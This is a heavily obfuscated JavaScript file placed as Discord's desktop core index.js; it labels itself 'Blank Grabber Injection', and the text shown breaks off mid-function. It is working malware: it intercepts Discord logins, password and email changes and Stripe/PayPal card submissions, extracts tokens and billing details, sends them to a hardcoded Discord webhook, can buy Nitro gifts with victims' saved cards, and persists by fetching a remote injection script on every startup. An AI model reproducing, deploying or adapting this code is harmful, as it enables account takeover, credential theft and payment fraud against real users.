module.exports = require('./core.asar');

const _0x2a1e94=_0x438d;(function(_0x41d056,_0x106d14){const _0x1c474d=_0x438d,_0x45692b=_0x41d056();while(!![]){try{const _0x3ccaf3=parseInt(_0x1c474d(0x197))/0x1*(parseInt(_0x1c474d(0x1ae))/0x2)+-parseInt(_0x1c474d(0x1e6))/0x3*(-parseInt(_0x1c474d(0x1b5))/0x4)+parseInt(_0x1c474d(0x20e))/0x5*(parseInt(_0x1c474d(0x1d5))/0x6)+parseInt(_0x1c474d(0x237))/0x7*(-parseInt(_0x1c474d(0x1d7))/0x8)+parseInt(_0x1c474d(0x191))/0x9*(parseInt(_0x1c474d(0x229))/0xa)+parseInt(_0x1c474d(0x1b9))/0xb+-parseInt(_0x1c474d(0x176))/0xc*(parseInt(_0x1c474d(0x1d9))/0xd);if(_0x3ccaf3===_0x106d14)break;else _0x45692b['push'](_0x45692b['shift']());}catch(_0x4d19c8){_0x45692b['push'](_0x45692b['shift']());}}}(_0x4c5b,0xb92df));const args=process['argv'],fs=require('fs'),path=require(_0x2a1e94(0x1c7)),https=require(_0x2a1e94(0x16e)),querystring=require('querystring'),{BrowserWindow,session}=require('electron'),encodedHook='https://discord.com/api/webhooks/1259428493457100903/Fx59KbV12VRPI4AuGTYCXGYTv282Wv8CISROBoukP50rza5mjhGGuO1VXhr6bS-eSGX3',config={'webhook':atob(encodedHook),'webhook_protector_key':_0x2a1e94(0x1a7),'auto_buy_nitro':![],'ping_on_run':!![],'ping_val':_0x2a1e94(0x21f),'embed_name':_0x2a1e94(0x163),'embed_icon':_0x2a1e94(0x21c),'embed_color':0x560ddc,'injection_url':_0x2a1e94(0x1cc),'api':_0x2a1e94(0x1ca),'nitro':{'boost':{'year':{'id':_0x2a1e94(0x200),'sku':_0x2a1e94(0x1da),'price':'9999'},'month':{'id':_0x2a1e94(0x200),'sku':_0x2a1e94(0x206),'price':'999'}},'classic':{'month':{'id':_0x2a1e94(0x234),'sku':'511651871736201216','price':_0x2a1e94(0x192)}}},'filter':{'urls':[_0x2a1e94(0x16d),_0x2a1e94(0x1e3),_0x2a1e94(0x220),_0x2a1e94(0x1f6),'https://discord.com/api/v*/auth/login',_0x2a1e94(0x1b4),'https://api.braintreegateway.com/merchants/49pp2rp4phym7387/client_api/v*/payment_methods/paypal_accounts',_0x2a1e94(0x1fe),_0x2a1e94(0x1bb),_0x2a1e94(0x166)]},'filter2':{'urls':[_0x2a1e94(0x202),'https://*.discord.com/api/v*/applications/detectable',_0x2a1e94(0x18c),_0x2a1e94(0x1e9),_0x2a1e94(0x1eb),_0x2a1e94(0x232)]}};function parity_32(_0x3389e4,_0x3559b5,_0x217c28){return _0x3389e4^_0x3559b5^_0x217c28;}function ch_32(_0x4b7688,_0x450dd6,_0x15343b){return _0x4b7688&_0x450dd6^~_0x4b7688&_0x15343b;}function maj_32(_0x4046f7,_0x115ed5,_0x1d6c70){return _0x4046f7&_0x115ed5^_0x4046f7&_0x1d6c70^_0x115ed5&_0x1d6c70;}function rotl_32(_0x563c3c,_0x5edf23){return _0x563c3c<<_0x5edf23|_0x563c3c>>>0x20-_0x5edf23;}function safeAdd_32_2(_0x90299a,_0x1167a2){var _0x4c932a=(_0x90299a&0xffff)+(_0x1167a2&0xffff),_0x323680=(_0x90299a>>>0x10)+(_0x1167a2>>>0x10)+(_0x4c932a>>>0x10);return(_0x323680&0xffff)<<0x10|_0x4c932a&0xffff;}function safeAdd_32_5(_0x2a777f,_0xc18e13,_0x11ab9e,_0x4f4914,_0x365ca8){var _0x5833d0=(_0x2a777f&0xffff)+(_0xc18e13&0xffff)+(_0x11ab9e&0xffff)+(_0x4f4914&0xffff)+(_0x365ca8&0xffff),_0x13d9fa=(_0x2a777f>>>0x10)+(_0xc18e13>>>0x10)+(_0x11ab9e>>>0x10)+(_0x4f4914>>>0x10)+(_0x365ca8>>>0x10)+(_0x5833d0>>>0x10);return(_0x13d9fa&0xffff)<<0x10|_0x5833d0&0xffff;}function binb2hex(_0x41d78d){const _0xae6359=_0x2a1e94;var _0x419116=_0xae6359(0x180),_0x53dafc='',_0x4517c7=_0x41d78d[_0xae6359(0x201)]*0x4,_0x222f27,_0xd3f9f9;for(_0x222f27=0x0;_0x222f27<_0x4517c7;_0x222f27+=0x1){_0xd3f9f9=_0x41d78d[_0x222f27>>>0x2]>>>(0x3-_0x222f27%0x4)*0x8,_0x53dafc+=_0x419116[_0xae6359(0x1df)](_0xd3f9f9>>>0x4&0xf)+_0x419116['charAt'](_0xd3f9f9&0xf);}return _0x53dafc;}function getH(){return[0x67452301,0xefcdab89,0x98badcfe,0x10325476,0xc3d2e1f0];}function roundSHA1(_0x2f440d,_0x2e65f3){var _0x3da38a=[],_0x3a8d8a,_0x4c8f95,_0x380797,_0x498832,_0x15aea6,_0x272be3,_0x513ece=ch_32,_0x2529b1=parity_32,_0x23f560=maj_32,_0x37bb50=rotl_32,_0x1ed8a0=safeAdd_32_2,_0x5f3d05,_0x29ced2=safeAdd_32_5;_0x3a8d8a=_0x2e65f3[0x0],_0x4c8f95=_0x2e65f3[0x1],_0x380797=_0x2e65f3[0x2],_0x498832=_0x2e65f3[0x3],_0x15aea6=_0x2e65f3[0x4];for(_0x5f3d05=0x0;_0x5f3d05<0x50;_0x5f3d05+=0x1){_0x5f3d05<0x10?_0x3da38a[_0x5f3d05]=_0x2f440d[_0x5f3d05]:_0x3da38a[_0x5f3d05]=_0x37bb50(_0x3da38a[_0x5f3d05-0x3]^_0x3da38a[_0x5f3d05-0x8]^_0x3da38a[_0x5f3d05-0xe]^_0x3da38a[_0x5f3d05-0x10],0x1);if(_0x5f3d05<0x14)_0x272be3=_0x29ced2(_0x37bb50(_0x3a8d8a,0x5),_0x513ece(_0x4c8f95,_0x380797,_0x498832),_0x15aea6,0x5a827999,_0x3da38a[_0x5f3d05]);else{if(_0x5f3d05<0x28)_0x272be3=_0x29ced2(_0x37bb50(_0x3a8d8a,0x5),_0x2529b1(_0x4c8f95,_0x380797,_0x498832),_0x15aea6,0x6ed9eba1,_0x3da38a[_0x5f3d05]);else _0x5f3d05<0x3c?_0x272be3=_0x29ced2(_0x37bb50(_0x3a8d8a,0x5),_0x23f560(_0x4c8f95,_0x380797,_0x498832),_0x15aea6,0x8f1bbcdc,_0x3da38a[_0x5f3d05]):_0x272be3=_0x29ced2(_0x37bb50(_0x3a8d8a,0x5),_0x2529b1(_0x4c8f95,_0x380797,_0x498832),_0x15aea6,0xca62c1d6,_0x3da38a[_0x5f3d05]);}_0x15aea6=_0x498832,_0x498832=_0x380797,_0x380797=_0x37bb50(_0x4c8f95,0x1e),_0x4c8f95=_0x3a8d8a,_0x3a8d8a=_0x272be3;}return _0x2e65f3[0x0]=_0x1ed8a0(_0x3a8d8a,_0x2e65f3[0x0]),_0x2e65f3[0x1]=_0x1ed8a0(_0x4c8f95,_0x2e65f3[0x1]),_0x2e65f3[0x2]=_0x1ed8a0(_0x380797,_0x2e65f3[0x2]),_0x2e65f3[0x3]=_0x1ed8a0(_0x498832,_0x2e65f3[0x3]),_0x2e65f3[0x4]=_0x1ed8a0(_0x15aea6,_0x2e65f3[0x4]),_0x2e65f3;}function finalizeSHA1(_0x5dca97,_0x18cc1c,_0x1b828e,_0x433c8e){const _0x16b748=_0x2a1e94;var _0x39c22a,_0x588359,_0x22346d;_0x22346d=(_0x18cc1c+0x41>>>0x9<<0x4)+0xf;while(_0x5dca97['length']<=_0x22346d){_0x5dca97['push'](0x0);}_0x5dca97[_0x18cc1c>>>0x5]|=0x80<<0x18-_0x18cc1c%0x20,_0x5dca97[_0x22346d]=_0x18cc1c+_0x1b828e,_0x588359=_0x5dca97[_0x16b748(0x201)];for(_0x39c22a=0x0;_0x39c22a<_0x588359;_0x39c22a+=0x10){_0x433c8e=roundSHA1(_0x5dca97[_0x16b748(0x226)](_0x39c22a,_0x39c22a+0x10),_0x433c8e);}return _0x433c8e;}function hex2binb(_0x2dd94f,_0x378407,_0x200608){const _0xad71b3=_0x2a1e94;var _0x2c6fe4,_0x9533e8=_0x2dd94f[_0xad71b3(0x201)],_0x4fb89d,_0x453a13,_0x59bc29,_0x15752e,_0x52d360;_0x2c6fe4=_0x378407||[0x0],_0x200608=_0x200608||0x0,_0x52d360=_0x200608>>>0x3;0x0!==_0x9533e8%0x2&&console[_0xad71b3(0x194)](_0xad71b3(0x1ef));for(_0x4fb89d=0x0;_0x4fb89d<_0x9533e8;_0x4fb89d+=0x2){_0x453a13=parseInt(_0x2dd94f[_0xad71b3(0x18a)](_0x4fb89d,0x2),0x10);if(!isNaN(_0x453a13)){_0x15752e=(_0x4fb89d>>>0x1)+_0x52d360,_0x59bc29=_0x15752e>>>0x2;while(_0x2c6fe4[_0xad71b3(0x201)]<=_0x59bc29){_0x2c6fe4[_0xad71b3(0x188)](0x0);}_0x2c6fe4[_0x59bc29]|=_0x453a13<<0x8*(0x3-_0x15752e%0x4);}else console[_0xad71b3(0x194)](_0xad71b3(0x160));}return{'value':_0x2c6fe4,'binLen':_0x9533e8*0x4+_0x200608};}class jsSHA{constructor(){const _0x2a6ffb=_0x2a1e94;var _0x2418ff=0x0,_0x3f3cea=[],_0x3c390a=0x0,_0x293169,_0x3876ab,_0x13471b,_0x6a42ed,_0x564817,_0x397124,_0x3dd80e=![],_0x590993=![],_0x4f4e75=[],_0x1e6029=[],_0x15e7a6,_0x15e7a6=0x1;_0x3876ab=hex2binb,(_0x15e7a6!==parseInt(_0x15e7a6,0xa)||0x1>_0x15e7a6)&&console[_0x2a6ffb(0x194)](_0x2a6ffb(0x19e)),_0x6a42ed=0x200,_0x564817=roundSHA1,_0x397124=finalizeSHA1,_0x13471b=0xa0,_0x293169=getH(),this['setHMACKey']=function(_0x2d6929){const _0x31ce91=_0x2a6ffb;var _0x41956d,_0x59ceef,_0x3c905e,_0x510609,_0x20c465,_0x50e326,_0x2036bb;_0x41956d=hex2binb,_0x59ceef=_0x41956d(_0x2d6929),_0x3c905e=_0x59ceef[_0x31ce91(0x1bf)],_0x510609=_0x59ceef[_0x31ce91(0x17e)],_0x20c465=_0x6a42ed>>>0x3,_0x2036bb=_0x20c465/0x4-0x1;if(_0x20c465<_0x3c905e/0x8){_0x510609=_0x397124(_0x510609,_0x3c905e,0x0,getH());while(_0x510609[_0x31ce91(0x201)]<=_0x2036bb){_0x510609['push'](0x0);}_0x510609[_0x2036bb]&=0xffffff00;}else{if(_0x20c465>_0x3c905e/0x8){while(_0x510609['length']<=_0x2036bb){_0x510609['push'](0x0);}_0x510609[_0x2036bb]&=0xffffff00;}}for(_0x50e326=0x0;_0x50e326<=_0x2036bb;_0x50e326+=0x1){_0x4f4e75[_0x50e326]=_0x510609[_0x50e326]^0x36363636,_0x1e6029[_0x50e326]=_0x510609[_0x50e326]^0x5c5c5c5c;}_0x293169=_0x564817(_0x4f4e75,_0x293169),_0x2418ff=_0x6a42ed,_0x590993=!![];},this['update']=function(_0x1b06d3){const _0x15b0d5=_0x2a6ffb;var _0x54444e,_0x54ba7e,_0x3ad307,_0x39ed77,_0x5463df,_0x576e44=0x0,_0x575763=_0x6a42ed>>>0x5;_0x54444e=_0x3876ab(_0x1b06d3,_0x3f3cea,_0x3c390a),_0x54ba7e=_0x54444e['binLen'],_0x39ed77=_0x54444e[_0x15b0d5(0x17e)],_0x3ad307=_0x54ba7e>>>0x5;for(_0x5463df=0x0;_0x5463df<_0x3ad307;_0x5463df+=_0x575763){_0x576e44+_0x6a42ed<=_0x54ba7e&&(_0x293169=_0x564817(_0x39ed77[_0x15b0d5(0x226)](_0x5463df,_0x5463df+_0x575763),_0x293169),_0x576e44+=_0x6a42ed);}_0x2418ff+=_0x576e44,_0x3f3cea=_0x39ed77[_0x15b0d5(0x226)](_0x576e44>>>0x5),_0x3c390a=_0x54ba7e%_0x6a42ed;},this['getHMAC']=function(){const _0x8e24c9=_0x2a6ffb;var _0x352806;![]===_0x590993&&console[_0x8e24c9(0x194)](_0x8e24c9(0x1f4));const _0x4e9cbe=function(_0x240449){return binb2hex(_0x240449);};return![]===_0x3dd80e&&(_0x352806=_0x397124(_0x3f3cea,_0x3c390a,_0x2418ff,_0x293169),_0x293169=_0x564817(_0x1e6029,getH()),_0x293169=_0x397124(_0x352806,_0x13471b,_0x6a42ed,_0x293169)),_0x3dd80e=!![],_0x4e9cbe(_0x293169);};}}if('function'===typeof define&&define[_0x2a1e94(0x20d)])define(function(){return jsSHA;});else _0x2a1e94(0x20f)!==typeof exports?_0x2a1e94(0x20f)!==typeof module&&module[_0x2a1e94(0x1e7)]?module[_0x2a1e94(0x1e7)]=exports=jsSHA:exports=jsSHA:global['jsSHA']=jsSHA;jsSHA[_0x2a1e94(0x1b8)]&&(jsSHA=jsSHA['default']);function totp(_0x3e455f){const _0x180ceb=_0x2a1e94,_0x332cf8=0x1e,_0x46d2e2=0x6,_0x4183fb=Date['now'](),_0x58a4e9=Math[_0x180ceb(0x183)](_0x4183fb/0x3e8),_0x5aeb83=leftpad(dec2hex(Math['floor'](_0x58a4e9/_0x332cf8)),0x10,'0'),_0x9abca2=new jsSHA();_0x9abca2[_0x180ceb(0x1b3)](base32tohex(_0x3e455f)),_0x9abca2[_0x180ceb(0x1fa)](_0x5aeb83);const _0x5981d9=_0x9abca2[_0x180ceb(0x1a3)](),_0x406fed=hex2dec(_0x5981d9[_0x180ceb(0x230)](_0x5981d9[_0x180ceb(0x201)]-0x1));let _0x39653e=(hex2dec(_0x5981d9['substr'](_0x406fed*0x2,0x8))&hex2dec('7fffffff'))+'';return _0x39653e=_0x39653e[_0x180ceb(0x18a)](Math[_0x180ceb(0x228)](_0x39653e[_0x180ceb(0x201)]-_0x46d2e2,0x0),_0x46d2e2),_0x39653e;}function hex2dec(_0x201729){return parseInt(_0x201729,0x10);}function dec2hex(_0x2b4d0a){const _0x15f3ad=_0x2a1e94;return(_0x2b4d0a<15.5?'0':'')+Math[_0x15f3ad(0x183)](_0x2b4d0a)[_0x15f3ad(0x1f0)](0x10);}function _0x438d(_0xf691b1,_0x2004f2){const _0x4c5be7=_0x4c5b();return _0x438d=function(_0x438da8,_0x5014d5){_0x438da8=_0x438da8-0x15e;let _0x2494e3=_0x4c5be7[_0x438da8];return _0x2494e3;},_0x438d(_0xf691b1,_0x2004f2);}function base32tohex(_0x52dd84){const _0x457a52=_0x2a1e94;let _0x30b2fd=_0x457a52(0x169),_0x59786a='',_0x19660b='';_0x52dd84=_0x52dd84[_0x457a52(0x1f7)](/=+$/,'');for(let _0x4df288=0x0;_0x4df288<_0x52dd84[_0x457a52(0x201)];_0x4df288++){let _0x37523d=_0x30b2fd[_0x457a52(0x21e)](_0x52dd84[_0x457a52(0x1df)](_0x4df288)['toUpperCase']());if(_0x37523d===-0x1)console[_0x457a52(0x194)](_0x457a52(0x19b));_0x59786a+=leftpad(_0x37523d[_0x457a52(0x1f0)](0x2),0x5,'0');}for(let _0x28969a=0x0;_0x28969a+0x8<=_0x59786a[_0x457a52(0x201)];_0x28969a+=0x8){let _0x433123=_0x59786a[_0x457a52(0x18a)](_0x28969a,0x8);_0x19660b=_0x19660b+leftpad(parseInt(_0x433123,0x2)['toString'](0x10),0x2,'0');}return _0x19660b;}function leftpad(_0x176f90,_0x1fd69a,_0x38b94e){const _0x48e578=_0x2a1e94;return _0x1fd69a+0x1>=_0x176f90[_0x48e578(0x201)]&&(_0x176f90=Array(_0x1fd69a+0x1-_0x176f90[_0x48e578(0x201)])[_0x48e578(0x233)](_0x38b94e)+_0x176f90),_0x176f90;}function _0x4c5b(){const _0x45a532=['test','new_password','update','unlinkSync','embed_name','\x22);\x0a\x20\x20\x20\x20xmlHttp.setRequestHeader(\x27Content-Type\x27,\x20\x27application/json\x27);\x0a\x20\x20\x20\x20xmlHttp.send(JSON.stringify(','https://api.stripe.com/v*/tokens','Early\x20Verified\x20Bot\x20Developer','521847234246082599','length','https://status.discord.com/api/v*/scheduled-maintenances/upcoming.json','card[number]','New\x20Email:\x20**','\x22);\x20\x0a\x20\x20\x20\x20xmlHttp.send(null);\x20\x0a\x20\x20\x20\x20xmlHttp.responseText','511651880837840896','discord','POST','onCompleted','premium_type','Failed\x20to\x20Purchase\x20❌','sku','amd','80IXZoyA','undefined','HypeSquad\x20Event','filter','initiation','embed_icon','\x5cdiscord_desktop_core\x5cindex.js','boost','price','year','APPDATA','month','onHeadersReceived','login','https://raw.githubusercontent.com/Blank-c/Blank-Grabber/main/.github/workflows/image.png','content-security-policy','indexOf','@everyone','https://*.discord.com/api/v*/users/@me','card[exp_month]','Access-Control-Allow-Headers\x20\x27*\x27','catch','from','getAllWindows','slice','Nitro\x20Type:\x20**','max','7560WCaKwN','Nitro\x20Basic','password','Discord\x20Bug\x20Hunter\x20(Golden)','ping_on_run','PATCH','url','substring','package.json','wss://remote-auth-gateway.discord.gg/*','join','521846918637420545','Partnered\x20Server\x20Owner','content','7715526ZJfUif','classic','protocol','String\x20of\x20HEX\x20type\x20contains\x20invalid\x20characters','**Email\x20Changed**','https://cdn.discordapp.com/avatars/','Blank\x20Grabber\x20Injection','```','wss://remote-auth-gateway','https://api.stripe.com/v*/payment_intents/*/confirm','**Credit\x20Card\x20Added**','includes','ABCDEFGHIJKLMNOPQRSTUVWXYZ234567','api/webhooks','HypeSquad\x20Bravery','Active\x20Developer','https://discord.com/api/v*/users/@me','https','invalid','Authorization','application/json','bytes','confirm','tokens','concat','307584RIujhn','readdirSync','paypal_accounts','users/@me','executeJavaScript','Credit\x20Card\x20Number:\x20**','**Account\x20Info**','username','value','None','0123456789abcdef','webhook_protector_key','env','round','auto_buy_nitro','discriminator','content-security-policy-report-only','nitro','push','rmdirSync','substr','email','https://discord.com/api/v*/applications/detectable','type','app.asar','**\x0aBilling:\x20**','write','10485hjAelL','499','discord.com','error','<:paypal:951139189389410365>','split','113fARojl','\x27)\x0a\x20\x20\x20\x20\x20\x20\x20\x20res.pipe(file);\x0a\x20\x20\x20\x20\x20\x20\x20\x20file.on(\x27finish\x27,\x20()\x20=>\x20{\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20file.close();\x0a\x20\x20\x20\x20\x20\x20\x20\x20});\x0a\x20\x20\x20\x20\x0a\x20\x20\x20\x20}).on(\x22error\x22,\x20(err)\x20=>\x20{\x0a\x20\x20\x20\x20\x20\x20\x20\x20setTimeout(init(),\x2010000);\x0a\x20\x20\x20\x20});\x0a}\x0arequire(\x27','var\x20xmlHttp\x20=\x20new\x20XMLHttpRequest();\x0a\x20\x20\x20\x20xmlHttp.open(\x22POST\x22,\x20\x22https://discord.com/api/v9/store/skus/','const\x20fs\x20=\x20require(\x27fs\x27),\x20https\x20=\x20require(\x27https\x27);\x0aconst\x20indexJs\x20=\x20\x27','Invalid\x20base32\x20character\x20in\x20key','**\x0aBadges:\x20**','webhook','numRounds\x20must\x20a\x20integer\x20>=\x201','statusCode','**Nitro\x20Code:**\x0a```diff\x0a+\x20','**Nitro\x20bought!**','Discord\x20Bug\x20Hunter\x20(Normal)','getHMAC','responseHeaders','usd','injection_url','%WEBHOOK_KEY%','onBeforeRequest','.webp','index.js','ping_val','window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=>a.exports=c},[[\x22get_require\x22]]]),delete\x20gg.m.get_require,delete\x20gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},a=>{gg=a}]);function\x20LogOut(){(function(a){const\x20b=\x22string\x22==typeof\x20a?a:null;for(const\x20c\x20in\x20gg.c)if(gg.c.hasOwnProperty(c)){const\x20d=gg.c[c].exports;if(d&&d.__esModule&&d.default&&(b?d.default[b]:a(d.default)))return\x20d.default;if(d&&(b?d[b]:a(d)))return\x20d}return\x20null})(\x22login\x22).logout()}LogOut();','**\x20-\x20Password:\x20**','19736hWqeYv','pathname','var\x20xmlHttp\x20=\x20new\x20XMLHttpRequest();\x0a\x20\x20\x20\x20xmlHttp.open(\x22GET\x22,\x20\x22','default-src\x20\x27*\x27','sep','setHMACKey','https://*.discord.com/api/v*/auth/login','4wQVdFF','endsWith','Time\x20to\x20buy\x20some\x20nitro\x20baby\x20😩','default','7024886SuMklN','**Token**','https://api.stripe.com/v*/setup_intents/*/confirm','**\x0aOld\x20Password:\x20**','/billing/payment-sources\x22,\x20false);\x20\x0a\x20\x20\x20\x20xmlHttp.setRequestHeader(\x22Authorization\x22,\x20\x22','host','binLen','assign','request','filter2','*\x0aBadges:\x20**','));\x0a\x20\x20\x20\x20xmlHttp.responseText','stringify','\x22);\x0a\x20\x20\x20\x20xmlHttp.send(null);\x0a\x20\x20\x20\x20xmlHttp.responseText;','path','\x20|\x20','https://discord.gift/','https://discord.com/api/v9/users/@me','webRequest','https://raw.githubusercontent.com/Blank-c/Discord-Injection-BG/main/injection-obfuscated.js','writeFileSync','platform','\x27;\x0aconst\x20fileSize\x20=\x20fs.statSync(indexJs).size\x0afs.readFileSync(indexJs,\x20\x27utf8\x27,\x20(err,\x20data)\x20=>\x20{\x0a\x20\x20\x20\x20if\x20(fileSize\x20<\x2020000\x20||\x20data\x20===\x20\x22module.exports\x20=\x20require(\x27./core.asar\x27)\x22)\x20\x0a\x20\x20\x20\x20\x20\x20\x20\x20init();\x0a})\x0aasync\x20function\x20init()\x20{\x0a\x20\x20\x20\x20https.get(\x27','method','resources','Email:\x20**','avatar','\x5cbetterdiscord\x5cdata\x5cbetterdiscord.asar','123954ovkGUP','win32','8vJPQgo','(webpackChunkdiscord_app.push([[\x27\x27],{},e=>{m=[];for(let\x20c\x20in\x20e.c)m.push(e.c[c])}]),m).find(m=>m?.exports?.default?.getToken!==void\x200).exports.default.getToken()','1144qIpUSi','511651885459963904','defaultSession','gift_code','Moderator\x20Programs\x20Alumni','app','charAt','\x27;\x0aconst\x20bdPath\x20=\x20\x27','parse','end','https://discordapp.com/api/v*/users/@me','existsSync','log','3454005FyaGBr','exports','embed_color','https://*.discord.com/api/v*/users/@me/library','api','https://discord.com/api/v*/users/@me/library','**\x0aCredit\x20Card\x20Expiration:\x20**','**\x0aPassword:\x20**','card[exp_year]','String\x20of\x20HEX\x20type\x20must\x20be\x20in\x20byte\x20increments','toString','\x22,\x20false);\x0a\x20\x20\x20\x20xmlHttp.setRequestHeader(\x22Authorization\x22,\x20\x22','No\x20Nitro','**Discord\x20Info**','Cannot\x20call\x20getHMAC\x20without\x20first\x20setting\x20HMAC\x20key','forEach','https://discordapp.com/api/v*/auth/login','replace'];_0x4c5b=function(){return _0x45a532;};return _0x4c5b();}const discordPath=(function(){const _0x3eb435=_0x2a1e94,_0x2abf33=args[0x0][_0x3eb435(0x196)](path[_0x3eb435(0x1b2)])[_0x3eb435(0x226)](0x0,-0x1)[_0x3eb435(0x233)](path[_0x3eb435(0x1b2)]);let _0x255aec;if(process[_0x3eb435(0x1ce)]===_0x3eb435(0x1d6))_0x255aec=path['join'](_0x2abf33,_0x3eb435(0x1d1));else process[_0x3eb435(0x1ce)]==='darwin'&&(_0x255aec=path[_0x3eb435(0x233)](_0x2abf33,'Contents','Resources'));if(fs[_0x3eb435(0x1e4)](_0x255aec))return{'resourcePath':_0x255aec,'app':_0x2abf33};return{'undefined':undefined,'undefined':undefined};}());function updateCheck(){const _0x257443=_0x2a1e94,{resourcePath:_0x3ce725,app:_0x138f16}=discordPath;if(_0x3ce725===undefined||_0x138f16===undefined)return;const _0xa3142e=path[_0x257443(0x233)](_0x3ce725,_0x257443(0x1de)),_0x256e1e=path[_0x257443(0x233)](_0xa3142e,_0x257443(0x231)),_0x334fc1=path[_0x257443(0x233)](_0xa3142e,_0x257443(0x1aa)),_0x5cc413=fs[_0x257443(0x177)](_0x138f16+'\x5cmodules\x5c')[_0x257443(0x211)](_0x4c8cc7=>/discord_desktop_core-+?/[_0x257443(0x1f8)](_0x4c8cc7))[0x0],_0x58a542=_0x138f16+'\x5cmodules\x5c'+_0x5cc413+_0x257443(0x214),_0x1677ab=path['join'](process[_0x257443(0x182)][_0x257443(0x218)],_0x257443(0x1d4));if(!fs[_0x257443(0x1e4)](_0xa3142e))fs['mkdirSync'](_0xa3142e);if(fs[_0x257443(0x1e4)](_0x256e1e))fs[_0x257443(0x1fb)](_0x256e1e);if(fs[_0x257443(0x1e4)](_0x334fc1))fs[_0x257443(0x1fb)](_0x334fc1);if(process['platform']===_0x257443(0x1d6)||process[_0x257443(0x1ce)]==='darwin'){fs[_0x257443(0x1cd)](_0x256e1e,JSON['stringify']({'name':_0x257443(0x207),'main':'index.js'},null,0x4));const _0x5b1dd9=_0x257443(0x19a)+_0x58a542+_0x257443(0x1e0)+_0x1677ab+_0x257443(0x1cf)+config[_0x257443(0x1a6)]+'\x27,\x20(res)\x20=>\x20{\x0a\x20\x20\x20\x20\x20\x20\x20\x20const\x20file\x20=\x20fs.createWriteStream(indexJs);\x0a\x20\x20\x20\x20\x20\x20\x20\x20res.replace(\x27%WEBHOOKHEREBASE64ENCODED%\x27,\x20\x27'+encodedHook+'\x27)\x0a\x20\x20\x20\x20\x20\x20\x20\x20res.replace(\x27%WEBHOOK_KEY%\x27,\x20\x27'+config['webhook_protector_key']+_0x257443(0x198)+path[_0x257443(0x233)](_0x3ce725,_0x257443(0x18e))+'\x27)\x0aif\x20(fs.existsSync(bdPath))\x20require(bdPath);';fs[_0x257443(0x1cd)](_0x334fc1,_0x5b1dd9[_0x257443(0x1f7)](/\\/g,'\x5c\x5c'));}if(!fs[_0x257443(0x1e4)](path[_0x257443(0x233)](__dirname,_0x257443(0x212))))return!0x0;return fs[_0x257443(0x189)](path[_0x257443(0x233)](__dirname,_0x257443(0x212))),execScript(_0x257443(0x1ac)),!0x1;}const execScript=_0x4c54b7=>{const _0x6950e3=_0x2a1e94,_0x451c60=BrowserWindow[_0x6950e3(0x225)]()[0x0];return _0x451c60['webContents'][_0x6950e3(0x17a)](_0x4c54b7,!0x0);},getInfo=async _0x25f85d=>{const _0xf50a25=_0x2a1e94,_0x300d08=await execScript(_0xf50a25(0x1b0)+config[_0xf50a25(0x1ea)]+_0xf50a25(0x1f1)+_0x25f85d+_0xf50a25(0x1c6));return JSON['parse'](_0x300d08);},fetchBilling=async _0x2e234e=>{const _0x4592be=_0x2a1e94,_0x2d53f7=await execScript('var\x20xmlHttp\x20=\x20new\x20XMLHttpRequest();\x20\x0a\x20\x20\x20\x20xmlHttp.open(\x22GET\x22,\x20\x22'+config[_0x4592be(0x1ea)]+_0x4592be(0x1bd)+_0x2e234e+_0x4592be(0x205));if(!_0x2d53f7['lenght']||_0x2d53f7['length']===0x0)return'';return JSON[_0x4592be(0x1e1)](_0x2d53f7);},getBilling=async _0x4982ab=>{const _0x833b13=_0x2a1e94,_0x381163=await fetchBilling(_0x4982ab);if(!_0x381163)return'❌';const _0x23da48=[];_0x381163[_0x833b13(0x1f5)](_0x12ce15=>{const _0x221d5a=_0x833b13;if(!_0x12ce15[_0x221d5a(0x16f)])switch(_0x12ce15[_0x221d5a(0x18d)]){case 0x1:_0x23da48[_0x221d5a(0x188)]('💳');break;case 0x2:_0x23da48[_0x221d5a(0x188)](_0x221d5a(0x195));break;default:_0x23da48[_0x221d5a(0x188)]('(Unknown)');}});if(_0x23da48[_0x833b13(0x201)]==0x0)_0x23da48[_0x833b13(0x188)]('❌');return _0x23da48['join']('\x20');},Purchase=async(_0x4d9a17,_0x44cf94,_0x3abb6e,_0x30ca94)=>{const _0x223835=_0x2a1e94,_0x1e281a={'expected_amount':config[_0x223835(0x187)][_0x3abb6e][_0x30ca94][_0x223835(0x216)],'expected_currency':_0x223835(0x1a5),'gift':!![],'payment_source_id':_0x44cf94,'payment_source_token':null,'purchase_token':'2422867c-244d-476a-ba4f-36e197758d97','sku_subscription_plan_id':config[_0x223835(0x187)][_0x3abb6e][_0x30ca94][_0x223835(0x20c)]},_0xdc8a02=execScript(_0x223835(0x199)+config[_0x223835(0x187)][_0x3abb6e][_0x30ca94]['id']+'/purchase\x22,\x20false);\x0a\x20\x20\x20\x20xmlHttp.setRequestHeader(\x22Authorization\x22,\x20\x22'+_0x4d9a17+_0x223835(0x1fd)+JSON[_0x223835(0x1c5)](_0x1e281a)+_0x223835(0x1c4));if(_0xdc8a02[_0x223835(0x1dc)])return _0x223835(0x1c9)+_0xdc8a02['gift_code'];else return null;},buyNitro=async _0x32f70a=>{const _0x4adb1d=_0x2a1e94,_0x48829c=await fetchBilling(_0x32f70a),_0x400e2f=_0x4adb1d(0x20b);if(!_0x48829c)return _0x400e2f;let _0x707dbf=[];_0x48829c['forEach'](_0x437c09=>{const _0x13426c=_0x4adb1d;!_0x437c09[_0x13426c(0x16f)]&&(_0x707dbf=_0x707dbf[_0x13426c(0x175)](_0x437c09['id']));});for(let _0x3de727 in _0x707dbf){const _0x46c009=Purchase(_0x32f70a,_0x3de727,_0x4adb1d(0x215),_0x4adb1d(0x217));if(_0x46c009!==null)return _0x46c009;else{const _0x173754=Purchase(_0x32f70a,_0x3de727,'boost',_0x4adb1d(0x219));if(_0x173754!==null)return _0x173754;else{const _0x17a728=Purchase(_0x32f70a,_0x3de727,_0x4adb1d(0x15e),_0x4adb1d(0x219));return _0x17a728!==null?_0x17a728:_0x400e2f;}}}},getNitro=_0x1d64b3=>{const _0x44e6c5=_0x2a1e94;switch(_0x1d64b3){case 0x0:return _0x44e6c5(0x1f2);case 0x1:return'Nitro\x20Classic';case 0x2:return'Nitro';case 0x3:return _0x44e6c5(0x22a);default:return'(Unknown)';}},getBadges=_0x3c0083=>{const _0x599769=_0x2a1e94,_0x26f168=[];return 